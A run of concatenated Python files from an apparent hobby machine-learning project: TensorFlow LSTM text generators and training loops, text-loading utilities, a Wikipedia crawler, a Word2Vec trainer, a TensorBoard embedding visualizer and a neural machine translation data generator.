    f = open("generates/python.txt", "a", encoding="utf8")
    int2char_target = { v:k for k, v in char2int_target.items() }
    for prime in ["#"*100]:
        samp = sample(checkpoint, 5000, train_chars.lstm_size, len(char2int_target), char2int_target, int2char_target, prime=prime)
        print(samp, file=f)
        print(samp)
        print("="*50)
        print("="*50, file=f)




import numpy as np
import train_words


def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c


def sample(checkpoint, n_samples, lstm_size, vocab_size, prime=["The"]):
    samples = [c for c in prime]
    model = train_words.CharRNN(len(train_words.vocab), lstm_size=lstm_size, sampling=True)
    saver = train_words.tf.train.Saver()
    with train_words.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = train_words.vocab_to_int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

        c = pick_top_n(preds, len(train_words.vocab))
        samples.append(train_words.int_to_vocab[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, len(train_words.vocab))
            char = train_words.int_to_vocab[c]
            samples.append(char)
        
    return ' '.join(samples)


if __name__ == "__main__":
    # checkpoint = train_words.tf.train_words.latest_checkpoint("checkpoints")
    # print(checkpoint)
    checkpoint = f"{train_words.CHECKPOINT}/i8000_l128.ckpt"
    samp = sample(checkpoint, 400, train_words.lstm_size, len(train_words.vocab), prime=["the", "very"])
    print(samp)




import tensorflow as tf
import numpy as np



def get_batches(arr, batch_size, n_steps):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))

    for n in range(0, arr.shape[1], n_steps):
        x = arr[:, n: n+n_steps]
        y_temp = arr[:, n+1:n+n_steps+1]
        y = np.zeros(x.shape, dtype=y_temp.dtype)
        y[:, :y_temp.shape[1]] = y_temp
        yield x, y


# batches = get_batches(encoded, 10, 50)
# x, y = next(batches)


def build_inputs(batch_size, num_steps):
    ''' Define placeholders for inputs, targets, and dropout 
    
        Arguments
        ---------
        batch_size: Batch size, number of sequences per batch
        num_steps: Number of sequence steps in a batch
        
    '''
    # Declare placeholders we'll feed into the graph
    inputs = tf.placeholder(tf.int32, shape=(batch_size, num_steps), name="inputs")
    targets = tf.placeholder(tf.int32, shape=(batch_size, num_steps), name="targets")
    
    # Keep probability placeholder for drop out layers
    keep_prob = tf.placeholder(tf.float32, name="keep_prob")
    
    return inputs, targets, keep_prob


def build_lstm(lstm_size, num_layers, batch_size, keep_prob):
    ''' Build LSTM cell.
    
        Arguments
        ---------
        lstm_size: Size of the hidden layers in the LSTM cells
        num_layers: Number of LSTM layers
        batch_size: Batch size
        keep_prob: Scalar tensor (tf.placeholder) for the dropout keep probability

    '''
    ### Build the LSTM Cell
    def build_cell():    
        # Use a basic LSTM cell
        lstm = tf.contrib.rnn.BasicLSTMCell(lstm_size)
        # Add dropout to the cell outputs
        drop_lstm = tf.contrib.rnn.DropoutWrapper(lstm, output_keep_prob=keep_prob)
        return drop_lstm
    
    
    # Stack up multiple LSTM layers, for deep learning
    # build num_layers layers of lstm_size LSTM Cells
    cell = tf.contrib.rnn.MultiRNNCell([build_cell() for _ in range(num_layers)])
    initial_state = cell.zero_state(batch_size, tf.float32)
    
    return cell, initial_state


def build_output(lstm_output, in_size, out_size):
    ''' Build a softmax layer, return the softmax output and logits.
    
        Arguments
        ---------
        
        lstm_output: List of output tensors from the LSTM layer
        in_size: Size of the input tensor, for example, size of the LSTM cells
        out_size: Size of this softmax layer
    
    '''
    # Reshape output so it's a bunch of rows, one row for each step for each sequence.
    # Concatenate lstm_output over axis 1 (the columns)
    seq_output = tf.concat(lstm_output, axis=1)
    # Reshape seq_output to a 2D tensor with lstm_size columns
    x = tf.reshape(seq_output, (-1, in_size))
    
    # Connect the RNN outputs to a softmax layer
    with tf.variable_scope('softmax'):
        # Create the weight and bias variables here
        softmax_w = tf.Variable(tf.truncated_normal((in_size, out_size), stddev=0.1))
        softmax_b = tf.Variable(tf.zeros(out_size))
    
    # Since output is a bunch of rows of RNN cell outputs, logits will be a bunch
    # of rows of logit outputs, one for each step and sequence
    logits = tf.matmul(x, softmax_w) + softmax_b
    
    # Use softmax to get the probabilities for predicted characters
    out = tf.nn.softmax(logits, name="predictions")
    
    return out, logits


def build_loss(logits, targets, num_classes):
    ''' Calculate the loss from the logits and the targets.
    
        Arguments
        ---------
        logits: Logits from final fully connected layer
        targets: Targets for supervised learning
        num_classes: Number of classes in targets
        
    '''
     # One-hot encode targets and reshape to match logits, one row per sequence per step
    y_one_hot = tf.one_hot(targets, num_classes)
    y_reshaped =  tf.reshape(y_one_hot, logits.get_shape())
    
    # Softmax cross entropy loss
    loss = tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=y_reshaped)
    loss = tf.reduce_mean(loss)
    
    return loss


def build_optimizer(loss, learning_rate, grad_clip):
    ''' Build optmizer for training, using gradient clipping.
    
        Arguments:
        loss: Network loss
        learning_rate: Learning rate for optimizer
        grad_clip: threshold for preventing gradient exploding
    '''
    
    # Optimizer for training, using gradient clipping to control exploding gradients
    tvars = tf.trainable_variables()
    grads, _ = tf.clip_by_global_norm(tf.gradients(loss, tvars), grad_clip)
    train_op = tf.train.AdamOptimizer(learning_rate)
    optimizer = train_op.apply_gradients(zip(grads, tvars))
    
    return optimizer



class CharRNN:
    
    def __init__(self, num_classes, batch_size=64, num_steps=50, 
                       lstm_size=128, num_layers=2, learning_rate=0.001, 
                       grad_clip=5, sampling=False):
    
        # When we're using this network for sampling later, we'll be passing in
        # one character at a time, so providing an option for that
        if sampling:
            batch_size, num_steps = 1, 1
        else:
            batch_size, num_steps = batch_size, num_steps

        tf.reset_default_graph()
        
        # Build the input placeholder tensors
        self.inputs, self.targets, self.keep_prob = build_inputs(batch_size, num_steps)

        # Build the LSTM cell
        # (lstm_size, num_layers, batch_size, keep_prob)
        cell, self.initial_state = build_lstm(lstm_size, num_layers, batch_size, self.keep_prob)

        ### Run the data through the RNN layers
        
        # First, one-hot encode the input tokens
        x_one_hot = tf.one_hot(self.inputs, num_classes)
        
        # Run each sequence step through the RNN with tf.nn.dynamic_rnn 
        outputs, state = tf.nn.dynamic_rnn(cell, x_one_hot, initial_state=self.initial_state)
        self.final_state = state
        
        # Get softmax predictions and logits
        # (lstm_output, in_size, out_size)
        # There are lstm_size nodes in hidden layers, and the number
        # of the total characters as num_classes (i.e output layer)
        self.prediction, self.logits = build_output(outputs, lstm_size, num_classes)
        
        # Loss and optimizer (with gradient clipping)
        # (logits, targets, lstm_size, num_classes)
        self.loss = build_loss(self.logits, self.targets, num_classes)
        # (loss, learning_rate, grad_clip)
        self.optimizer = build_optimizer(self.loss, learning_rate, grad_clip)




from time import perf_counter
from collections import namedtuple
from parameters import *
from train import *
from utils import get_time, get_text

import tqdm
import numpy as np
import os
import string
import tensorflow as tf




if __name__ == "__main__":

    CHECKPOINT = "checkpoints"

    if not os.path.isdir(CHECKPOINT):
        os.mkdir(CHECKPOINT)


    vocab, int2char, char2int, text = get_text(char_level=True,
                                                files=["E:\\datasets\\python_code_small.py", "E:\\datasets\\my_python_code.py"],
                                                load=False,
                                                lower=False,
                                                save_index=4)

    print(char2int)
    
    encoded = np.array([char2int[c] for c in text])

    print("[*] Total characters :", len(text))
    print("[*] Number of classes :", len(vocab))

    model = CharRNN(num_classes=len(vocab), batch_size=batch_size, num_steps=num_steps,
                lstm_size=lstm_size, num_layers=num_layers, 
                learning_rate=learning_rate)

    saver = tf.train.Saver(max_to_keep=100)
    with tf.Session(config=tf.ConfigProto(intra_op_parallelism_threads=NUM_THREADS)) as sess:
        sess.run(tf.global_variables_initializer())
        
        # Use the line below to load a checkpoint and resume training
        saver.restore(sess, f'{CHECKPOINT}/e13_l256.ckpt')
        
        total_steps = len(encoded) // batch_size // num_steps
        for e in range(14, epochs):
            # Train network
            cs = 0
            new_state = sess.run(model.initial_state)
            min_loss = np.inf
            batches = tqdm.tqdm(get_batches(encoded, batch_size, num_steps),
                                f"Epoch= {e+1}/{epochs} - {cs}/{total_steps}",
                                total=total_steps)
            for x, y in batches:
                cs += 1
                start = perf_counter()
                feed = {model.inputs: x,
                        model.targets: y,
                        model.keep_prob: keep_prob,
                        model.initial_state: new_state}
                batch_loss, new_state, _ = sess.run([model.loss, 
                                                    model.final_state, 
                                                    model.optimizer], 
                                                    feed_dict=feed)
                

                
            
                batches.set_description(f"Epoch: {e+1}/{epochs} - {cs}/{total_steps} loss:{batch_loss:.2f}")
            saver.save(sess, f"{CHECKPOINT}/e{e}_l{lstm_size}.ckpt")
            print("Loss:", batch_loss)
        
        saver.save(sess, f"{CHECKPOINT}/i{cs}_l{lstm_size}.ckpt")




from time import perf_counter
from collections import namedtuple
from colorama import Fore, init

# local
from parameters import *
from train import *
from utils import get_time, get_text

init()

GREEN = Fore.GREEN
RESET = Fore.RESET

import numpy as np
import os
import tensorflow as tf
import string


CHECKPOINT = "checkpoints_words"
files = ["carroll-alice.txt", "text.txt", "text8.txt"]

if not os.path.isdir(CHECKPOINT):
    os.mkdir(CHECKPOINT)

vocab, int2word, word2int, text = get_text("data", files=files)

encoded = np.array([word2int[w] for w in text])

del text

if __name__ == "__main__":

    def calculate_time():
        global time_took
        global start
        global total_time_took
        global times_took
        global avg_time_took
        global time_estimated
        global total_steps

        time_took = perf_counter() - start
        total_time_took += time_took
        times_took.append(time_took)
        avg_time_took = sum(times_took) / len(times_took)
        time_estimated = total_steps * avg_time_took - total_time_took

    model = CharRNN(num_classes=len(vocab), batch_size=batch_size, num_steps=num_steps,
                lstm_size=lstm_size, num_layers=num_layers, 
                learning_rate=learning_rate)

    saver = tf.train.Saver(max_to_keep=100)
    with tf.Session(config=tf.ConfigProto(intra_op_parallelism_threads=NUM_THREADS)) as sess:
        sess.run(tf.global_variables_initializer())
        
        # Use the line below to load a checkpoint and resume training
        # saver.restore(sess, f'{CHECKPOINT}/i3524_l128_loss=1.36.ckpt')
        
        # calculate total steps
        total_steps = epochs * len(encoded) / (batch_size * num_steps)
        time_estimated = "N/A"
        times_took = []
        total_time_took = 0
        current_steps = 0
        progress_percentage = 0
        for e in range(epochs):
            # Train network
            new_state = sess.run(model.initial_state)
            min_loss = np.inf
            for x, y in get_batches(encoded, batch_size, num_steps):
                current_steps += 1
                start = perf_counter()
                feed = {model.inputs: x,
                        model.targets: y,
                        model.keep_prob: keep_prob,
                        model.initial_state: new_state}
                batch_loss, new_state, _ = sess.run([model.loss, 
                                                    model.final_state, 
                                                    model.optimizer], 
                                                    feed_dict=feed)
                
                progress_percentage = current_steps * 100 / total_steps

                if batch_loss < min_loss:
                    # saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}_loss={batch_loss:.2f}.ckpt")
                    min_loss = batch_loss
                    calculate_time()
                    print(f'{GREEN}[{progress_percentage:.2f}%] Epoch: {e+1:3}/{epochs} Training loss: {batch_loss:2.4f} - {time_took:2.4f} s/batch - ETA: {get_time(time_estimated)}{RESET}')
                    continue
                if (current_steps % print_every_n == 0):
                    calculate_time()
                    print(f'[{progress_percentage:.2f}%] Epoch: {e+1:3}/{epochs} Training loss: {batch_loss:2.4f} - {time_took:2.4f} s/batch - ETA: {get_time(time_estimated)}', end='\r')
                if (current_steps % save_every_n == 0):
                    saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}.ckpt")
        
        saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}.ckpt")




import tqdm
import os
import inflect
import glob
import pickle
import sys
from string import punctuation, whitespace

p = inflect.engine()
UNK = "<unk>"

char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


def get_time(seconds, form="{hours:02}:{minutes:02}:{seconds:02}"):
    try:
        seconds = int(seconds)
    except:
        return seconds
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    months, days = divmod(days, 30)
    years, months = divmod(months, 12)
    if days:
        form = "{days}d " + form
    if months:
        form = "{months}m " + form
    elif years:
        form = "{years}y " + form
    return form.format(**locals())


def get_text(path="data",
            files=["carroll-alice.txt", "text.txt", "text8.txt"],
            load=True,
            char_level=False,
            lower=True,
            save=True,
            save_index=1):
    if load:
        # check if any pre-cleaned saved data exists first
        
        pickle_files = glob.glob(os.path.join(path, "text_data*.pickle"))
        if len(pickle_files) == 1:
            return pickle.load(open(pickle_files[0], "rb"))
        elif len(pickle_files) > 1:
            sizes = [ get_size(os.path.getsize(p)) for p in pickle_files ]
            s = ""
            for i, (file, size) in enumerate(zip(pickle_files, sizes), start=1):
                s += str(i) + " - " + os.path.basename(file) + f" ({size}) \n"
            choice = int(input(f"""Multiple data corpus found:
{s}
99 - use and clean .txt files
Please choose one:  """))
            
            if choice != 99:
                chosen_file = pickle_files[choice-1]
                print("[*] Loading pickled data...")
                return pickle.load(open(chosen_file, "rb"))
    text = ""
    for file in tqdm.tqdm(files, "Loading data"):
        file = os.path.join(path, file)
        with open(file) as f:
            if lower:
                text += f.read().lower()
            else:
                text += f.read()
    print(len(text))
    punc = set(punctuation)

    # text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c not in punc ])
    text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c in char2int_target ])
    # for ws in whitespace:
    #     text = text.replace(ws, " ")

    if char_level:
        text = list(text)
    else:    
        text = text.split()

    # new_text = []
    new_text = text
    # append = new_text.append
    # co = 0
    # if char_level:
    #     k = 0
    #     for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
    #         if not text[i].isdigit():
    #             append(text[i])
    #             k = 0
    #         else:
    #             # if this digit is mapped to a word already using 
    #             # the below method, then just continue
    #             if k >= 1:
    #                 k -= 1
    #                 continue
    #             # if there are more digits following this character
    #             # k = 0
    #             digits = ""
    #             while text[i+k].isdigit():
    #                 digits += text[i+k]
    #                 k += 1
    #             w = p.number_to_words(digits).replace("-", " ").replace(",", "")
    #             for c in w:
    #                 append(c)
    #             co += 1
    # else:
    #     for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
    #         # convert digits to words
    #         # (i.e '7' to 'seven')
    #         if text[i].isdigit():
    #             text[i] = p.number_to_words(text[i]).replace("-", " ")
    #             append(text[i])
    #             co += 1
    #         else:
    #             append(text[i])
    vocab = sorted(set(new_text))
    print(f"alices in vocab:", "alices" in vocab)
    # print(f"Converted {co} digits to words.")
    print(f"Total vocabulary size:", len(vocab))
    int2word = { i:w for i, w in enumerate(vocab) }
    word2int = { w:i for i, w in enumerate(vocab) }

    if save:
        pickle_filename = os.path.join(path, f"text_data_{save_index}.pickle")
        print("Pickling data for future use to", pickle_filename)
        pickle.dump((vocab, int2word, word2int, new_text), open(pickle_filename, "wb"))

    return vocab, int2word, word2int, new_text


def get_size(size, suffix="B"):
    factor = 1024
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if size < factor:
            return "{:.2f}{}{}".format(size, unit, suffix)
        size /= factor
    return "{:.2f}{}{}".format(size, "E", suffix)




import wikipedia
from threading import Thread





def gather(page_name):
    print(f"Crawling {page_name}")
    page = wikipedia.page(page_name)
    filename = page_name.replace(" ", "_")
    print(page.content, file=open(f"data/{filename}.txt", 'w', encoding="utf-8"))
    print(f"Done crawling {page_name}")
    for i in range(5):
        Thread(target=gather, args=(page.links[i],)).start()


if __name__ == "__main__":
    pages = ["Relativity"]

    for page in pages:
        gather(page)




# from keras.preprocessing.text import Tokenizer
from utils import chunk_seq
from collections import Counter
from nltk.corpus import stopwords
from keras.preprocessing.sequence import pad_sequences
import numpy as np
import gensim

sequence_length = 200
embedding_dim = 200
# window_size = 7
# vector_dim = 300
# epochs = 1000

# valid_size = 16     # Random set of words to evaluate similarity on.
# valid_window = 100  # Only pick dev samples in the head of the distribution.
# valid_examples = np.random.choice(valid_window, valid_size, replace=False)

with open("data/quran_cleaned.txt", encoding="utf8") as f:
    text = f.read()


# print(text[:500])
ayat = text.split(".")

words = []
for ayah in ayat:
    words.append(ayah.split())

# print(words[:5])
# stop words
stop_words = stopwords.words("arabic")
# most common come at the top
# vocab = [ w[0] for w in Counter(words).most_common() if w[0] not in stop_words]
# words = [ word for word in words if word not in stop_words]
new_words = []
for ayah in words:
    new_words.append([ w for w in ayah if w not in stop_words])

# print(len(vocab))
# n = len(words) / sequence_length
# # split text to n sequences
# print(words[:10])
# words = chunk_seq(words, len(ayat))
vocab = []
for ayah in new_words:
    for w in ayah:
        vocab.append(w)
vocab = sorted(set(vocab))
vocab2int = {w: i for i, w in enumerate(vocab, start=1)}
int2vocab = {i: w for i, w in enumerate(vocab, start=1)}

encoded_words = []
for ayah in new_words:
    encoded_words.append([ vocab2int[w] for w in ayah ])

encoded_words = pad_sequences(encoded_words)
# print(encoded_words[10])
words = []
for seq in encoded_words:
    words.append([ int2vocab[w] if w != 0 else "_unk_" for w in seq ])
# print(words[:5])
# # define model
print("Training Word2Vec Model...")
model = gensim.models.Word2Vec(sentences=words, size=embedding_dim, workers=7, min_count=1, window=6)
path_to_save = r"E:\datasets\word2vec_quran.txt"
print("Saving model...")
model.wv.save_word2vec_format(path_to_save, binary=False)
# print(dir(model))




from keras.layers import Embedding, LSTM, Dense, Activation, BatchNormalization
from keras.layers import Flatten
from keras.models import Sequential
from preprocess import words, vocab, sequence_length, sequences, vector_dim
from preprocess import window_size

model = Sequential()

model.add(Embedding(len(vocab), vector_dim, input_length=sequence_length))
model.add(Flatten())
model.add(Dense(1))

model.compile("adam", "binary_crossentropy")
model.fit()




def chunk_seq(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out


def encode_words(words, vocab2int):
    # encoded = [ vocab2int[word] for word in words ]
    encoded = []
    append = encoded.append
    for word in words:
        c = vocab2int.get(word)
        if c:
            append(c)
    return encoded

def remove_stop_words(vocab):
    # remove stop words
    vocab.remove("the")
    vocab.remove("of")
    vocab.remove("and")
    vocab.remove("in")
    vocab.remove("a")
    vocab.remove("to")
    vocab.remove("is")
    vocab.remove("as")
    vocab.remove("for")




# encoding: utf-8
"""
author: BrikerMan
contact: eliyar917gmail.com
blog: https://eliyar.biz
version: 1.0
license: Apache Licence
file: w2v_visualizer.py
time: 2017/7/30 9:37
"""
import sys
import os
import pathlib
import numpy as np
from gensim.models.keyedvectors import KeyedVectors
import tensorflow as tf
from tensorflow.contrib.tensorboard.plugins import projector


def visualize(model, output_path):
    meta_file = "w2x_metadata.tsv"
    placeholder = np.zeros((len(model.wv.index2word), model.vector_size))

    with open(os.path.join(output_path, meta_file), 'wb') as file_metadata:
        for i, word in enumerate(model.wv.index2word):
            placeholder[i] = model[word]
            # temporary solution for https://github.com/tensorflow/tensorflow/issues/9094
            if word == '':
                print("Emply Line, should replecaed by any thing else, or will cause a bug of tensorboard")
                file_metadata.write("{0}".format('<Empty Line>').encode('utf-8') + b'\n')
            else:
                file_metadata.write("{0}".format(word).encode('utf-8') + b'\n')

    # define the model without training
    sess = tf.InteractiveSession()

    embedding = tf.Variable(placeholder, trainable=False, name='w2x_metadata')
    tf.global_variables_initializer().run()

    saver = tf.train.Saver()
    writer = tf.summary.FileWriter(output_path, sess.graph)

    # adding into projector
    config = projector.ProjectorConfig()
    embed = config.embeddings.add()
    embed.tensor_name = 'w2x_metadata'
    embed.metadata_path = meta_file

    # Specify the width and height of a single thumbnail.
    projector.visualize_embeddings(writer, config)
    saver.save(sess, os.path.join(output_path, 'w2x_metadata.ckpt'))
    print('Run tensorboard --logdir={0} to run visualize result on tensorboard'.format(output_path))


if __name__ == "__main__":
    """
    Use model.save_word2vec_format to save w2v_model as word2evc format
    Then just run python w2v_visualizer.py word2vec.text visualize_result
    """
    try:
        model_path = sys.argv[1]
        output_path = sys.argv[2]
    except:
        print("Please provice model path and output path")
    model = KeyedVectors.load_word2vec_format(model_path)
    pathlib.Path(output_path).mkdir(parents=True, exist_ok=True)
    visualize(model, output_path)




from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
from keras.utils import to_categorical
import numpy as np
import pickle
import tqdm

class NMTGenerator:
    """A class utility for generating Neural-Machine-Translation large datasets"""
    def __init__(self, source_file, target_file, num_encoder_tokens=None, num_decoder_tokens=None,
                source_sequence_length=None, target_sequence_length=None, x_tk=None, y_tk=None,
                batch_size=256, validation_split=0.15, load_tokenizers=False, dump_tokenizers=True,
                same_tokenizer=False, char_level=False, verbose=0):
        self.source_file = source_file
        self.target_file = target_file
        self.same_tokenizer = same_tokenizer
        self.char_level = char_level
        if not load_tokenizers:
            # x ( source ) tokenizer
            self.x_tk = x_tk if x_tk else Tokenizer(char_level=self.char_level)
            # y ( target ) tokenizer
            self.y_tk = y_tk if y_tk else Tokenizer(char_level=self.char_level)
        else:
            self.x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
            self.y_tk = pickle.load(open("results/y_tk.pickle", "rb"))
        # remove '?' and '.' from filters
        # which means include them in vocabulary
        # add "'" to filters
        self.x_tk.filters = self.x_tk.filters.replace("?", "").replace("_", "") + "'"
        self.y_tk.filters = self.y_tk.filters.replace("?", "").replace("_", "") + "'"
        
        if char_level:
            self.x_tk.filters = self.x_tk.filters.replace(".", "").replace(",", "")
            self.y_tk.filters = self.y_tk.filters.replace(".", "").replace(",", "")

        if same_tokenizer:
            self.y_tk = self.x_tk
        # max sequence length of source language
        self.source_sequence_length = source_sequence_length
        # max sequence length of target language
        self.target_sequence_length = target_sequence_length
        # vocab size of encoder
        self.num_encoder_tokens = num_encoder_tokens
        # vocab size of decoder
        self.num_decoder_tokens = num_decoder_tokens
        # the batch size
        self.batch_size = batch_size
        # the ratio which the dataset will be partitioned
        self.validation_split = validation_split
        # whether to dump x_tk and y_tk when finished tokenizing
        self.dump_tokenizers = dump_tokenizers
        # cap to remove _unk_ samples
        self.n_unk_to_remove = 2
        self.verbose = verbose

    def load_dataset(self):
        """Loads the dataset:
            1. load the data from files
            2. tokenize and calculate sequence lengths and num_tokens
            3. post pad the sequences"""
        self.load_data()
        if self.verbose:
            print("[+] Data loaded")
        self.tokenize()
        if self.verbose:
            print("[+] Text tokenized")
        self.pad_sequences()
        if self.verbose:
            print("[+] Sequences padded")
        self.split_data()
        if self.verbose:
            print("[+] Data splitted")

    def load_data(self):
        """Loads data from files"""
        self.X = load_data(self.source_file)
        self.y = load_data(self.target_file)
        # remove much unks on a single sample
        X, y = [], []
        co = 0
        for question, answer in zip(self.X, self.y):
            if question.count("_unk_") >= self.n_unk_to_remove or answer.count("_unk_") >= self.n_unk_to_remove:
                co += 1
            else:
                X.append(question)
                y.append(answer)
        self.X = X
        self.y = y
        if self.verbose >= 1:
            print("[*] Number of samples:", len(self.X))
        if self.verbose >= 2:
            print("[!] Number of samples deleted:", co)

    def tokenize(self):
        """Tokenizes sentences/strings as well as calculating input/output sequence lengths
        and input/output vocab sizes"""
        self.x_tk.fit_on_texts(self.X)
        self.y_tk.fit_on_texts(self.y)
        self.X = self.x_tk.texts_to_sequences(self.X)
        self.y = self.y_tk.texts_to_sequences(self.y)
        # calculate both sequence lengths ( source and target )
        self.source_sequence_length = max([len(x) for x in self.X])
        self.target_sequence_length = max([len(x) for x in self.y])
        # calculating number of encoder/decoder vocab sizes
        self.num_encoder_tokens = len(self.x_tk.index_word) + 1
        self.num_decoder_tokens = len(self.y_tk.index_word) + 1
        # dump tokenizers
        pickle.dump(self.x_tk, open("results/x_tk.pickle", "wb"))
        pickle.dump(self.y_tk, open("results/y_tk.pickle", "wb"))

    def pad_sequences(self):
        """Pad sequences"""
        self.X = pad_sequences(self.X, maxlen=self.source_sequence_length, padding='post')
        self.y = pad_sequences(self.y, maxlen=self.target_sequence_length, padding='post')

    def split_data(self):
        """split training/validation sets using self.validation_split"""
        split_value = int(len(self.X)*self.validation_split)
        self.X_test = self.X[:split_value]
        self.X_train = self.X[split_value:]
        self.y_test = self.y[:split_value]
        self.y_train = self.y[split_value:]
        # free up memory
        del self.X
        del self.y

    def shuffle_data(self, train=True):
        """Shuffles X and y together
        :params train (bool): whether to shuffle training data, default is True
            Note that when train is False, testing data is shuffled instead."""
        state = np.random.get_state()
        if train:
            np.random.shuffle(self.X_train)
            np.random.set_state(state)
            np.random.shuffle(self.y_train)
        else:
            np.random.shuffle(self.X_test)
            np.random.set_state(state)
            np.random.shuffle(self.y_test)

    def next_train(self):
        """Training set generator"""
        return self.generate_batches(self.X_train, self.y_train, train=True)

    def next_validation(self):
        """Validation set generator"""
        return self.generate_batches(self.X_test, self.y_test, train=False)

    def generate_batches(self, X, y, train=True):
        """Data generator"""
        same_tokenizer = self.same_tokenizer
        batch_size = self.batch_size
        char_level = self.char_level
        source_sequence_length = self.source_sequence_length
        target_sequence_length = self.target_sequence_length
        if same_tokenizer:
            num_encoder_tokens = max([self.num_encoder_tokens, self.num_decoder_tokens])
            num_decoder_tokens = num_encoder_tokens
        else:
            num_encoder_tokens = self.num_encoder_tokens
            num_decoder_tokens = self.num_decoder_tokens
        while True:
            for j in range(0, len(X), batch_size):
                encoder_input_data = X[j: j+batch_size]
                decoder_input_data = y[j: j+batch_size]
                # update batch size ( different size in last batch of the dataset )
                batch_size = encoder_input_data.shape[0]
                if self.char_level:
                    encoder_data = np.zeros((batch_size, source_sequence_length, num_encoder_tokens))
                    decoder_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens))
                else:
                    encoder_data = encoder_input_data
                    decoder_data = decoder_input_data
                
                decoder_target_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens))
                if char_level:
                    # if its char level, one-hot all sequences of characters
                    for i, sequence in enumerate(decoder_input_data):
                        for t, word_index in enumerate(sequence):
                            if t > 0:
                                decoder_target_data[i, t - 1, word_index] = 1
                            decoder_data[i, t, word_index] = 1
                    for i, sequence in enumerate(encoder_input_data):
                        for t, word_index in enumerate(sequence):
                            encoder_data[i, t, word_index] = 1
                else:
                    # if its word level, one-hot only target_data ( the one compared with dense )
                    for i, sequence in enumerate(decoder_input_data):
                        for t, word_index in enumerate(sequence):
                            if t > 0:
                                decoder_target_data[i, t - 1, word_index] = 1
                yield ([encoder_data, decoder_data], decoder_target_data)
            # shuffle data when an epoch is finished
            self.shuffle_data(train=train)




def get_embedding_vectors(tokenizer):
    embedding_index = {}
    with open("data/glove.6B.300d.txt", encoding='utf8') as f:
        for line in tqdm.tqdm(f, "Reading GloVe"):
            values = line.split()
            word = values[0]
            vectors = np.asarray(values[1:], dtype='float32')
            embedding_index[word] = vectors

    word_index = tokenizer.word_index
    embedding_matrix = np.zeros((len(word_index)+1, 300))
    for word, i in word_index.items():
        embedding_vector = embedding_index.get(word)
        if embedding_vector is not None:
            # words not found will be 0s
            embedding_matrix[i] = embedding_vector
            
    return embedding_matrix


def load_data(filename):
    text = []
    append = text.append
    with open(filename) as f:
        for line in tqdm.tqdm(f, f"Reading {filename}"):
            line = line.strip()
            append(line)
